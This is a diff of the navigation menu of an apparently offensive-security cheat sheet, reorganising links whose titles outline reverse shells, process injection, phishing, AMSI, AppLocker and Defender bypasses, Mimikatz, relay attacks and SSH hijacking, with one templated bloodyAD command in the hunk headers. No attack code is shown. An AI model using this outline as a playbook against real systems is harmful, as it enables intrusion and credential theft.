@@ -12047,47 +12069,47 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#initial-further-access-c-sharp">3.2.1 C#</a>
-          <a href="#initial-further-access-c-cpp">3.2.2 C/C++</a>
-          <a href="#initial-further-access-powershell">3.2.3 PowerShell</a>
-          <a href="#initial-further-access-powershell-obfuscated-reverse-shell">3.2.4 Obfuscated Reverse Shell</a>
-          <a href="#initial-further-access-powershell-meterpreter-reverse-shell">3.2.5 Meterpreter Reverse Shell</a>
-          <a href="#initial-further-access-powershell-load-into-memory">3.2.6 Load Directly Into Memory (Reflective One-Liners)</a>
-          <a href="#initial-further-access-webshells">3.2.7 WebShells</a>
-          <a href="#initial-further-access-webshells-aspx">3.2.8 ASPX</a>
-          <a href="#initial-further-access-webshells-jsp">3.2.9 JSP</a>
-          <a href="#initial-further-access-webshells-php">3.2.10 PHP</a>
+        <a href="#initial-further-access-c-sharp">3.2.1 C#</a>
         </div>
         <a href="#initial-further-access-c-sharp-bin-xor-revshell">2.2.1.1 BIN Shellcode XOR Encrypted Reverse Shell</a>
         <a href="#initial-further-access-c-sharp-process-injection">2.2.1.2 Process Injection Reverse Shell</a>
+        <a href="#initial-further-access-c-cpp">3.2.2 C/C++</a>
         <button class="dropdown-btn">2.2.2.1 EXE
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#initial-further-access-c-cpp-exe-revshell">2.2.2.1.1 Reverse Shell</a>
-          <a href="#initial-further-access-c-cpp-exe-revshell-alt">2.2.2.1.2 Reverse Shell (IP/Port as Arguments)</a>
-          <a href="#initial-further-access-c-cpp-exe-addadmin">2.2.2.1.3 Add New Admin</a>
+        <a href="#initial-further-access-c-cpp-exe-revshell">2.2.2.1.1 Reverse Shell</a>
+        <a href="#initial-further-access-c-cpp-exe-revshell-alt">2.2.2.1.2 Reverse Shell (IP/Port as Arguments)</a>
+        <a href="#initial-further-access-c-cpp-exe-addadmin">2.2.2.1.3 Add New Admin</a>
         </div>
         <button class="dropdown-btn">2.2.2.2 DLL
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#initial-further-access-c-cpp-dll-newadmin-c">2.2.2.2.1 New Admin with C</a>
-          <a href="#initial-further-access-c-cpp-dll-newadmin-cpp">2.2.2.2.2 New Admin with C++</a>
+        <a href="#initial-further-access-c-cpp-dll-newadmin-c">2.2.2.2.1 New Admin with C</a>
+        <a href="#initial-further-access-c-cpp-dll-newadmin-cpp">2.2.2.2.2 New Admin with C++</a>
+        <a href="#initial-further-access-powershell">3.2.3 PowerShell</a>
+        <a href="#initial-further-access-powershell-obfuscated-reverse-shell">3.2.4 Obfuscated Reverse Shell</a>
+        <a href="#initial-further-access-powershell-meterpreter-reverse-shell">3.2.5 Meterpreter Reverse Shell</a>
+        <a href="#initial-further-access-powershell-load-into-memory">3.2.6 Load Directly Into Memory (Reflective One-Liners)</a>
+        <a href="#initial-further-access-webshells">3.2.7 WebShells</a>
+        <a href="#initial-further-access-webshells-aspx">3.2.8 ASPX</a>
+        <a href="#initial-further-access-webshells-jsp">3.2.9 JSP</a>
+        <a href="#initial-further-access-webshells-php">3.2.10 PHP</a>
         </div>
         <button class="dropdown-btn">3.3 Upgrading Shells
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#initial-further-access-general-steps">3.3.1 General Steps</a>
-          <a href="#initial-further-access-exe">3.3.2 EXE</a>
-          <a href="#initial-further-access-exe-process-hollowing-sleeper">3.3.3 Process Hollowing with Sleeper</a>
-          <a href="#initial-further-access-exe-nativeprocinjection">3.3.4 NativeProcInjection</a>
-          <a href="#initial-further-access-exe-ntmapinjection">3.3.5 NtMapInjection</a>
-          <a href="#initial-further-access-exe-ntqueueapc">3.3.6 NtQueueApc</a>
-          <a href="#initial-further-access-exe-process-hollow">3.3.7 Process Hollow</a>
-          <a href="#initial-further-access-exe-tryharder">3.3.8 TryHarder</a>
-          <a href="#initial-further-access-dll">3.3.9 DLL</a>
+        <a href="#initial-further-access-general-steps">3.3.1 General Steps</a>
+        <a href="#initial-further-access-exe">3.3.2 EXE</a>
+        <a href="#initial-further-access-exe-process-hollowing-sleeper">3.3.3 Process Hollowing with Sleeper</a>
+        <a href="#initial-further-access-exe-nativeprocinjection">3.3.4 NativeProcInjection</a>
+        <a href="#initial-further-access-exe-ntmapinjection">3.3.5 NtMapInjection</a>
+        <a href="#initial-further-access-exe-ntqueueapc">3.3.6 NtQueueApc</a>
+        <a href="#initial-further-access-exe-process-hollow">3.3.7 Process Hollow</a>
+        <a href="#initial-further-access-exe-tryharder">3.3.8 TryHarder</a>
+        <a href="#initial-further-access-dll">3.3.9 DLL</a>
         </div>
         <a href="#initial-further-access-dll-shellcode-hollower">2.3.9.1 Shellcode Hollower</a>
         <a href="#initial-further-access-dll-shellcode-inject">2.3.9.2 Shellcode Inject</a>
@@ -12095,20 +12117,20 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#initial-further-access-calendar-phishing-ics-fields">3.4.1 ICS File Structure</a>
-          <a href="#initial-further-access-calendar-phishing-ics-template">3.4.2 Custom ICS Invite</a>
-          <a href="#initial-further-access-calendar-phishing-send">3.4.3 Sending the Invite</a>
-          <a href="#initial-further-access-calendar-phishing-automate">3.4.4 Automating the Attack</a>
-          <a href="#initial-further-access-calendar-phishing-responder">3.4.5 Credential Stealing with Responder</a>
+        <a href="#initial-further-access-calendar-phishing-ics-fields">3.4.1 ICS File Structure</a>
+        <a href="#initial-further-access-calendar-phishing-ics-template">3.4.2 Custom ICS Invite</a>
+        <a href="#initial-further-access-calendar-phishing-send">3.4.3 Sending the Invite</a>
+        <a href="#initial-further-access-calendar-phishing-automate">3.4.4 Automating the Attack</a>
+        <a href="#initial-further-access-calendar-phishing-responder">3.4.5 Credential Stealing with Responder</a>
         </div>
         <button class="dropdown-btn">3.5 Process Injection & Migration
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#initial-further-access-procinj-remote-thread">3.5.1 Remote Thread Injection</a>
-          <a href="#initial-further-access-procinj-dll">3.5.2 DLL Injection</a>
-          <a href="#initial-further-access-procinj-reflective-dll">3.5.3 Reflective DLL Injection</a>
-          <a href="#initial-further-access-procinj-hollowing">3.5.4 Process Hollowing</a>
+        <a href="#initial-further-access-procinj-remote-thread">3.5.1 Remote Thread Injection</a>
+        <a href="#initial-further-access-procinj-dll">3.5.2 DLL Injection</a>
+        <a href="#initial-further-access-procinj-reflective-dll">3.5.3 Reflective DLL Injection</a>
+        <a href="#initial-further-access-procinj-hollowing">3.5.4 Process Hollowing</a>
         </div>
       </div>
     </div>
@@ -12121,23 +12143,23 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#tunneling-ligolo-ng-normal-instructions">4.1.1 Normal Instructions</a>
-          <a href="#tunneling-ligolo-ng-av-bypassing">4.1.2 AV Bypassing</a>
-        </div>
+        <a href="#tunneling-ligolo-ng-normal-instructions">4.1.1 Normal Instructions</a>
         <a href="#tunneling-ligolo-ng-simple-tunneling">3.1.1.1 Simple Tunneling</a>
         <a href="#tunneling-ligolo-ng-reverse-shells">3.1.1.2 Reverse Shells From Internal Networks</a>
         <a href="#tunneling-ligolo-ng-double-tunneling">3.1.1.3 Double Tunneling</a>
         <a href="#tunneling-ligolo-ng-local-port-forwarding">3.1.1.4 Local Port Forwarding</a>
         <a href="#tunneling-ligolo-ng-file-transfers">3.1.1.5 File Transfers From Internal Networks</a>
+        <a href="#tunneling-ligolo-ng-av-bypassing">4.1.2 AV Bypassing</a>
         <a href="#tunneling-ligolo-ng-applocker-bypass">3.1.2.1 Agent AppLocker Bypass</a>
         <a href="#tunneling-ligolo-ng-clm-bypass">3.1.2.2 Agent CLM Bypass</a>
         <a href="#tunneling-ligolo-ng-shellcode-runner">3.1.2.3 Agent Shellcode Runner</a>
+        </div>
         <button class="dropdown-btn">4.2 Metasploit
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#tunneling-metasploit-autoroute">4.2.1 Autoroute</a>
-          <a href="#tunneling-metasploit-socks">4.2.2 SOCKS Proxy</a>
+        <a href="#tunneling-metasploit-autoroute">4.2.1 Autoroute</a>
+        <a href="#tunneling-metasploit-socks">4.2.2 SOCKS Proxy</a>
         </div>
         <a href="#tunneling-sshuttle">4.3 sshuttle</a>
         <a href="#tunneling-domain-fronting">4.4 Domain Fronting</a>
@@ -12145,7 +12167,7 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
       </div>
     </div>
     <div class="section-flow-5">
-      <button class="dropdown-btn">5. Windows Post Exploitation
+      <button class="dropdown-btn">5. Windows Post-Exploitation
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
@@ -12153,13 +12175,10 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#privilege-escalation-enumeration">5.1.1 Enumeration</a>
-          <a href="#privilege-escalation-finding-files">5.1.2 Finding Files</a>
-          <a href="#privilege-escalation-powershell-goldmine">5.1.3 PowerShell Goldmine (logs)</a>
-          <a href="#privilege-escalation-access-tokens-seimpersonate">5.1.4 Access Tokens - SeImpersonate</a>
-          <a href="#privilege-escalation-alwaysinstallelevated">5.1.5 AlwaysInstallElevated</a>
-          <a href="#privilege-escalation-service-binary-hijacking">5.1.6 Service Binary Hijacking</a>
-          <a href="#privilege-escalation-kiosk-breakouts">5.1.7 Kiosk Breakouts</a>
+        <a href="#privilege-escalation-enumeration">5.1.1 Enumeration</a>
+        <a href="#privilege-escalation-finding-files">5.1.2 Finding Files</a>
+        <a href="#privilege-escalation-powershell-goldmine">5.1.3 PowerShell Goldmine (logs)</a>
+        <a href="#privilege-escalation-access-tokens-seimpersonate">5.1.4 Access Tokens - SeImpersonate</a>
         </div>
         <a href="#privilege-escalation-access-tokens-seimpersonate-printspoofer">4.1.4.1 Impersonation with PrintSpoofer</a>
         <a href="#privilege-escalation-access-tokens-seimpersonate-incognito">4.1.4.2 Impersonation with Incognito (Meterpreter)</a>
@@ -12167,17 +12186,20 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#privilege-escalation-access-tokens-seimpersonate-printspooler-spoolsample">4.1.4.3.1 SpoolSample + SharpPrintSpoofer</a>
-          <a href="#privilege-escalation-access-tokens-seimpersonate-printspooler-spoolsample-modified">4.1.4.3.2 SpoolSample Modified - PS Reverse Shell Loader</a>
-          <a href="#privilege-escalation-access-tokens-seimpersonate-printspooler-sigmapotato">4.1.4.3.3 SigmaPotato .NET Reflection Memory Loading</a>
+        <a href="#privilege-escalation-access-tokens-seimpersonate-printspooler-spoolsample">4.1.4.3.1 SpoolSample + SharpPrintSpoofer</a>
+        <a href="#privilege-escalation-access-tokens-seimpersonate-printspooler-spoolsample-modified">4.1.4.3.2 SpoolSample Modified - PS Reverse Shell Loader</a>
+        <a href="#privilege-escalation-access-tokens-seimpersonate-printspooler-sigmapotato">4.1.4.3.3 SigmaPotato .NET Reflection Memory Loading</a>
         </div>
         <a href="#privilege-escalation-access-tokens-seimpersonate-fullpowers">4.1.4.4 FullPowers</a>
+        <a href="#privilege-escalation-alwaysinstallelevated">5.1.5 AlwaysInstallElevated</a>
         <a href="#privilege-escalation-alwaysinstallelevated-check">4.1.5.1 Check if Vulnerable</a>
         <a href="#privilege-escalation-alwaysinstallelevated-newlocaladmin">4.1.5.2 Exploit - NewLocalAdmin</a>
         <a href="#privilege-escalation-alwaysinstallelevated-reverse-shell">4.1.5.3 Exploit - Reverse Shell via MSI</a>
         <a href="#privilege-escalation-alwaysinstallelevated-msf-module">4.1.5.4 Exploit - Metasploit Module</a>
+        <a href="#privilege-escalation-service-binary-hijacking">5.1.6 Service Binary Hijacking</a>
         <a href="#privilege-escalation-service-binary-hijacking-basic-checks">4.1.6.1 Basic and Main Checks</a>
         <a href="#privilege-escalation-service-binary-hijacking-additional-checks">4.1.6.2 Additional Optional Checks</a>
+        <a href="#privilege-escalation-kiosk-breakouts">5.1.7 Kiosk Breakouts</a>
         <a href="#privilege-escalation-kiosk-enumeration">4.1.7.1 Kiosk Enumeration</a>
         <a href="#privilege-escalation-kiosk-command-execution">4.1.7.2 Command Execution</a>
         <a href="#privilege-escalation-kiosk-post-exploitation">4.1.7.3 Post-Exploitation & Privilege Escalation</a>
@@ -12185,25 +12207,23 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#defense-evasion-enumerate-defenses">5.2.1 Enumerate Defenses</a>
-          <a href="#defense-evasion-disable-applocker-clm">5.2.2 Disable AppLocker & CLM</a>
-          <a href="#defense-evasion-disable-amsi">5.2.3 Disable AMSI</a>
-          <a href="#defense-evasion-disable-defender">5.2.4 Disable Defender (requires Admin)</a>
-          <a href="#defense-evasion-disable-ppl">5.2.5 Disable PPL (Protected Processes Light) for Mimikatz</a>
-          <a href="#defense-evasion-uac-bypass">5.2.6 UAC Bypass</a>
-          <a href="#defense-evasion-shutdown-firewall">5.2.7 Shutdown Firewall</a>
-          <a href="#defense-evasion-enable-rdp-pass-the-hash">5.2.8 Enable RDP Pass-The-Hash</a>
-          <a href="#defense-evasion-locating-signatures">5.2.9 Locating & Breaking Signatures</a>
-          <a href="#defense-evasion-advanced-amsi">5.2.10 Advanced AMSI Bypasses</a>
-          <a href="#defense-evasion-applocker-bypasses">5.2.11 AppLocker Bypasses</a>
-          <a href="#defense-evasion-network-filters">5.2.12 Network Filter Evasion</a>
-          <a href="#defense-evasion-microsoft-defender">5.2.13 Microsoft Defender — Enumeration & Tampering</a>
+        <a href="#defense-evasion-enumerate-defenses">5.2.1 Enumerate Defenses</a>
+        <a href="#defense-evasion-disable-applocker-clm">5.2.2 Disable AppLocker & CLM</a>
+        <a href="#defense-evasion-disable-amsi">5.2.3 Disable AMSI</a>
+        <a href="#defense-evasion-disable-defender">5.2.4 Disable Defender (requires Admin)</a>
+        <a href="#defense-evasion-disable-ppl">5.2.5 Disable PPL (Protected Processes Light) for Mimikatz</a>
+        <a href="#defense-evasion-uac-bypass">5.2.6 UAC Bypass</a>
         </div>
         <a href="#defense-evasion-uac-bypass-cmstp">4.2.6.1 CMSTP</a>
         <a href="#defense-evasion-uac-bypass-fodhelper">4.2.6.2 FodHelper</a>
         <a href="#defense-evasion-uac-bypass-eventviewer">4.2.6.3 EventViewer (unsafe .NET deserialization)</a>
         <a href="#defense-evasion-uac-bypass-computerdefaults">4.2.6.4 ComputerDefaults (registry hijack)</a>
         <a href="#defense-evasion-uac-bypass-obfuscated">4.2.6.5 Obfuscated UAC Bypass (encoded payload)</a>
+        <a href="#defense-evasion-shutdown-firewall">5.2.7 Shutdown Firewall</a>
+        <a href="#defense-evasion-enable-rdp-pass-the-hash">5.2.8 Enable RDP Pass-The-Hash</a>
+        <a href="#defense-evasion-locating-signatures">5.2.9 Locating & Breaking Signatures</a>
+        <a href="#defense-evasion-advanced-amsi">5.2.10 Advanced AMSI Bypasses</a>
+        <a href="#defense-evasion-applocker-bypasses">5.2.11 AppLocker Bypasses</a>
         <a href="#defense-evasion-applocker-bypasses-enumerate">4.2.11.1 Enumerate AppLocker Policy</a>
         <a href="#defense-evasion-applocker-bypasses-trusted-folders">4.2.11.2 Writable Whitelisted Folders</a>
         <a href="#defense-evasion-applocker-bypasses-dll">4.2.11.3 Unmanaged DLL Loading</a>
@@ -12216,10 +12236,12 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
         <a href="#defense-evasion-applocker-bypasses-msbuild">4.2.11.10 MSBuild Inline Task</a>
         <a href="#defense-evasion-applocker-bypasses-jscript">4.2.11.11 JScript: MSHTA and XSL Transform</a>
         <a href="#defense-evasion-applocker-bypasses-lolbas-table">4.2.11.12 LOLBAS Bypass Reference</a>
+        <a href="#defense-evasion-network-filters">5.2.12 Network Filter Evasion</a>
         <a href="#defense-evasion-network-filters-dns">4.2.12.1 DNS Filters</a>
         <a href="#defense-evasion-network-filters-proxy">4.2.12.2 Web Proxies</a>
         <a href="#defense-evasion-network-filters-ids">4.2.12.3 IDS/IPS Signatures</a>
         <a href="#defense-evasion-network-filters-https-inspection">4.2.12.4 HTTPS Inspection</a>
+        <a href="#defense-evasion-microsoft-defender">5.2.13 Microsoft Defender — Enumeration & Tampering</a>
         <a href="#defense-evasion-defender-enum">4.2.13.1 Enumerating Defender</a>
         <a href="#defense-evasion-defender-tamper">4.2.13.2 Tampering (requires admin)</a>
         <a href="#defense-evasion-defender-static">4.2.13.3 Static Signature Evasion</a>
@@ -12228,13 +12250,7 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#credentials-mimikatz">5.3.1 Mimikatz</a>
-          <a href="#credentials-cracking-hashes">5.3.2 Cracking Hashes</a>
-          <a href="#credentials-pass-the-hash">5.3.3 Pass-The-Hash</a>
-          <a href="#credentials-relay-attacks">5.3.4 Relay Attacks</a>
-          <a href="#credentials-spray-credentials">5.3.5 Spray Credentials</a>
-          <a href="#credentials-access-tokens">5.3.6 Access Token Manipulation</a>
-          <a href="#credentials-windows-lateral-movement">5.3.7 Windows Lateral Movement</a>
+        <a href="#credentials-mimikatz">5.3.1 Mimikatz</a>
         </div>
         <a href="#credentials-mimikatz-commands-without-credentials">4.3.1.1 Commands Without Credentials</a>
         <a href="#credentials-mimikatz-commands-with-credentials">4.3.1.2 Commands That Require Credentials</a>
@@ -12243,17 +12259,23 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
         <a href="#credentials-mimikatz-minidump">4.3.1.5 MiniDump</a>
         <a href="#credentials-mimikatz-kiwi">4.3.1.6 Kiwi (Meterpreter)</a>
         <a href="#credentials-mimikatz-invoke-mimikatz">4.3.1.7 Invoke-Mimikatz</a>
+        <a href="#credentials-cracking-hashes">5.3.2 Cracking Hashes</a>
         <a href="#credentials-cracking-hashes-ntlm">4.3.2.1 NTLM</a>
         <a href="#credentials-cracking-hashes-net-ntlmv2">4.3.2.2 Net-NTLMv2</a>
+        <a href="#credentials-pass-the-hash">5.3.3 Pass-The-Hash</a>
+        <a href="#credentials-relay-attacks">5.3.4 Relay Attacks</a>
+        <a href="#credentials-spray-credentials">5.3.5 Spray Credentials</a>
         <a href="#credentials-spray-credentials-hydra">4.3.5.1 Hydra</a>
         <a href="#credentials-spray-credentials-netexec">4.3.5.2 NetExec</a>
+        <a href="#credentials-access-tokens">5.3.6 Access Token Manipulation</a>
         <a href="#credentials-access-tokens-offline">4.3.6.1 Processing Credentials Offline</a>
+        <a href="#credentials-windows-lateral-movement">5.3.7 Windows Lateral Movement</a>
         <a href="#credentials-winlat-rdp">4.3.7.1 RDP & RDP Hijacking</a>
         <a href="#credentials-winlat-fileless">4.3.7.2 Fileless Lateral Movement</a>
       </div>
     </div>
     <div class="section-flow-6">
-      <button class="dropdown-btn">6. Linux Post Exploitation
+      <button class="dropdown-btn">6. Linux Post-Exploitation
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
@@ -12261,46 +12283,46 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#linux-initial-access-meterpreter">6.1.1 Meterpreter</a>
-          <a href="#linux-initial-access-reverse-shells">6.1.2 Reverse Shells</a>
-          <a href="#linux-initial-access-payloads">6.1.3 Payloads</a>
-          <a href="#linux-initial-access-payloads-xor-encoder">6.1.4 XOR Payload Encoder</a>
-          <a href="#linux-initial-access-payloads-simple-loader">6.1.5 Simple Loader</a>
-          <a href="#linux-initial-access-payloads-ld-preload">6.1.6 Shared Library LD PRELOAD</a>
-          <a href="#linux-initial-access-payloads-ld-library-path">6.1.7 Shared Library LD LIBRARY Path</a>
+        <a href="#linux-initial-access-meterpreter">6.1.1 Meterpreter</a>
+        <a href="#linux-initial-access-reverse-shells">6.1.2 Reverse Shells</a>
+        <a href="#linux-initial-access-payloads">6.1.3 Payloads</a>
+        <a href="#linux-initial-access-payloads-xor-encoder">6.1.4 XOR Payload Encoder</a>
+        <a href="#linux-initial-access-payloads-simple-loader">6.1.5 Simple Loader</a>
+        <a href="#linux-initial-access-payloads-ld-preload">6.1.6 Shared Library LD PRELOAD</a>
+        <a href="#linux-initial-access-payloads-ld-library-path">6.1.7 Shared Library LD LIBRARY Path</a>
         </div>
         <button class="dropdown-btn">6.2 Privilege Escalation
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#linux-privilege-escalation-enumeration">6.2.1 Enumeration</a>
-          <a href="#linux-privilege-escalation-abusing-suids">6.2.2 Abusing SUIDs</a>
-          <a href="#linux-privilege-escalation-important-files">6.2.3 Important Files</a>
-          <a href="#linux-privilege-escalation-password-files">6.2.4 Password Files</a>
-          <a href="#linux-privilege-escalation-passwd">6.2.5 /etc/passwd</a>
-          <a href="#linux-privilege-escalation-shadow">6.2.6 /etc/shadow</a>
-          <a href="#linux-privilege-escalation-unshadow">6.2.7 Cracking Both Files</a>
-          <a href="#linux-privilege-escalation-setuid-capabilities">6.2.8 Setuid Binaries and Capabilities</a>
-          <a href="#linux-privilege-escalation-setuid-binaries">6.2.9 Setuid Binaries</a>
-          <a href="#linux-privilege-escalation-exploiting-setuid">6.2.10 Exploiting Setuid Binaries</a>
-          <a href="#linux-privilege-escalation-cronjobs">6.2.11 Cronjobs</a>
+        <a href="#linux-privilege-escalation-enumeration">6.2.1 Enumeration</a>
+        <a href="#linux-privilege-escalation-abusing-suids">6.2.2 Abusing SUIDs</a>
+        <a href="#linux-privilege-escalation-important-files">6.2.3 Important Files</a>
+        <a href="#linux-privilege-escalation-password-files">6.2.4 Password Files</a>
+        <a href="#linux-privilege-escalation-passwd">6.2.5 /etc/passwd</a>
+        <a href="#linux-privilege-escalation-shadow">6.2.6 /etc/shadow</a>
+        <a href="#linux-privilege-escalation-unshadow">6.2.7 Cracking Both Files</a>
+        <a href="#linux-privilege-escalation-setuid-capabilities">6.2.8 Setuid Binaries and Capabilities</a>
+        <a href="#linux-privilege-escalation-setuid-binaries">6.2.9 Setuid Binaries</a>
+        <a href="#linux-privilege-escalation-exploiting-setuid">6.2.10 Exploiting Setuid Binaries</a>
+        <a href="#linux-privilege-escalation-cronjobs">6.2.11 Cronjobs</a>
         </div>
         <button class="dropdown-btn">6.3 Lateral Movement
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#linux-lateral-movement-configuration-files">6.3.1 Configuration Files</a>
-          <a href="#linux-lateral-movement-ssh">6.3.2 SSH</a>
-          <a href="#linux-lateral-movement-ssh-keys">6.3.3 SSH Keys</a>
-          <a href="#linux-lateral-movement-ssh-persistence">6.3.4 SSH Persistence</a>
-          <a href="#linux-lateral-movement-ssh-controlmaster">6.3.5 SSH Hijacking with ControlMaster</a>
-          <a href="#linux-lateral-movement-ssh-agent-forwarding">6.3.6 SSH Agent Forwarding</a>
-          <a href="#linux-lateral-movement-ansible">6.3.7 Ansible</a>
-          <a href="#linux-lateral-movement-artifactory">6.3.8 Artifactory (JFrog)</a>
-          <a href="#linux-lateral-movement-kerberos">6.3.9 Kerberos</a>
-          <a href="#linux-lateral-movement-kerberos-keytab">6.3.10 Stealing Keytab Files</a>
-          <a href="#linux-lateral-movement-kerberos-ccache">6.3.11 Stealing and Using Cached Files</a>
-          <a href="#linux-lateral-movement-kerberos-impacket">6.3.12 Using Impacket Suite with Kerberos</a>
+        <a href="#linux-lateral-movement-configuration-files">6.3.1 Configuration Files</a>
+        <a href="#linux-lateral-movement-ssh">6.3.2 SSH</a>
+        <a href="#linux-lateral-movement-ssh-keys">6.3.3 SSH Keys</a>
+        <a href="#linux-lateral-movement-ssh-persistence">6.3.4 SSH Persistence</a>
+        <a href="#linux-lateral-movement-ssh-controlmaster">6.3.5 SSH Hijacking with ControlMaster</a>
+        <a href="#linux-lateral-movement-ssh-agent-forwarding">6.3.6 SSH Agent Forwarding</a>
+        <a href="#linux-lateral-movement-ansible">6.3.7 Ansible</a>
+        <a href="#linux-lateral-movement-artifactory">6.3.8 Artifactory (JFrog)</a>
+        <a href="#linux-lateral-movement-kerberos">6.3.9 Kerberos</a>
+        <a href="#linux-lateral-movement-kerberos-keytab">6.3.10 Stealing Keytab Files</a>
+        <a href="#linux-lateral-movement-kerberos-ccache">6.3.11 Stealing and Using Cached Files</a>
+        <a href="#linux-lateral-movement-kerberos-impacket">6.3.12 Using Impacket Suite with Kerberos</a>
         </div>
         <a href="#linux-shared-libraries">6.4 Shared Library Hijacking</a>
         <a href="#linux-av-bypass">6.5 Defense Evasion</a>
@@ -12317,40 +12339,40 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#mssql-relay-attacks-capture-hashes">7.3.1 Capture Hashes</a>
-          <a href="#mssql-relay-attacks-relay-auth-to-other-server">7.3.2 Relay Auth to Other Server</a>
+        <a href="#mssql-relay-attacks-capture-hashes">7.3.1 Capture Hashes</a>
+        <a href="#mssql-relay-attacks-relay-auth-to-other-server">7.3.2 Relay Auth to Other Server</a>
         </div>
         <button class="dropdown-btn">7.4 Linked Server
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#mssql-linked-server-add-new-users">7.4.1 Add New Users for Linked Server</a>
+        <a href="#mssql-linked-server-add-new-users">7.4.1 Add New Users for Linked Server</a>
         </div>
         <button class="dropdown-btn">7.5 Privilege Escalation
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#mssql-privilege-escalation-impersonation">7.5.1 Impersonation</a>
-          <a href="#mssql-privilege-escalation-code-execution">7.5.2 Code Execution</a>
-          <a href="#mssql-privilege-escalation-clr">7.5.3 Code Execution through CLR</a>
-          <a href="#mssql-privilege-escalation-service-account-to-system">7.5.4 MSSQL Service Account to SYSTEM</a>
-          <a href="#mssql-privilege-escalation-mssqlpwner">7.5.5 MSSQLPwner</a>
+        <a href="#mssql-privilege-escalation-impersonation">7.5.1 Impersonation</a>
+        <a href="#mssql-privilege-escalation-code-execution">7.5.2 Code Execution</a>
+        <a href="#mssql-privilege-escalation-clr">7.5.3 Code Execution through CLR</a>
+        <a href="#mssql-privilege-escalation-service-account-to-system">7.5.4 MSSQL Service Account to SYSTEM</a>
+        <a href="#mssql-privilege-escalation-mssqlpwner">7.5.5 MSSQLPwner</a>
         </div>
         <button class="dropdown-btn">7.6 Quick Reference
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#mssql-reference-instance-discovery">7.6.1 Instance Discovery</a>
-          <a href="#mssql-reference-privilege-enumeration">7.6.2 Privilege Enumeration</a>
-          <a href="#mssql-reference-linked-servers">7.6.3 Linked Servers</a>
-          <a href="#mssql-reference-enable-xp-cmdshell">7.6.4 Enable xp_cmdshell</a>
-          <a href="#mssql-reference-xp-cmdshell-shell">7.6.5 xp_cmdshell Reverse Shell</a>
-          <a href="#mssql-reference-enable-rpcout">7.6.6 Enable RPCout</a>
+        <a href="#mssql-reference-instance-discovery">7.6.1 Instance Discovery</a>
+        <a href="#mssql-reference-privilege-enumeration">7.6.2 Privilege Enumeration</a>
+        <a href="#mssql-reference-linked-servers">7.6.3 Linked Servers</a>
+        <a href="#mssql-reference-enable-xp-cmdshell">7.6.4 Enable xp_cmdshell</a>
+        <a href="#mssql-reference-xp-cmdshell-shell">7.6.5 xp_cmdshell Reverse Shell</a>
+        <a href="#mssql-reference-enable-rpcout">7.6.6 Enable RPCout</a>
         </div>
       </div>
     </div>
     <div class="section-flow-8">
-      <button class="dropdown-btn">8. Active Directory Enumeration
+      <button class="dropdown-btn">8. AD Enumeration
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
@@ -12359,52 +12381,52 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#ad-enum-ldap-nmap">8.2.1 Nmap Scripting Scan</a>
-          <a href="#ad-enum-ldap-ldapsearch">8.2.2 ldapsearch</a>
-          <a href="#ad-enum-ldap-filters">8.2.3 Useful Search Filters</a>
+        <a href="#ad-enum-ldap-nmap">8.2.1 Nmap Scripting Scan</a>
+        <a href="#ad-enum-ldap-ldapsearch">8.2.2 ldapsearch</a>
+        <a href="#ad-enum-ldap-filters">8.2.3 Useful Search Filters</a>
         </div>
         <button class="dropdown-btn">8.3 Domain Enumeration
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#ad-enum-domain-from-linux">8.3.1 From Linux</a>
-          <a href="#ad-enum-domain-from-windows">8.3.2 From Windows</a>
-          <a href="#ad-enum-domain-unconstrained-delegation">8.3.3 Unconstrained Delegation</a>
